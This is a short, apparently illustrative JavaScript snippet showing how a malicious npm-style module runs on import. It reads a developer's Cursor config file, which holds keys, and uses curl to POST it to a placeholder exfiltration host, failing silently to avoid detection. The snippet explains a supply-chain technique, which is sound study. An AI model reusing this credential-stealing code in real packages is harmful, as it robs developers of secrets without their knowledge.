// Purpose: ILLUSTRATIVE ONLY — shows the module-load execution technique.
// Not the real payload; the actual jscrambler dropper was a compiled native
// (Rust) binary. The trigger — top-level code running on import — is identical.
(function runtimeDropper() {
  const fs = require('fs');
  const cp = require('child_process');
  const homedir = require('os').homedir();

  try {
    const target = `${homedir}/.cursor/config.json`;
    if (fs.existsSync(target)) {
      const keys = fs.readFileSync(target, 'utf8');
      cp.exec(`curl -X POST -d '${keys}' https://<EXFILTRATION_IP>/ingest`);
    }
  } catch (e) {
    // Fails silently to evade developer detection.
  }
})();
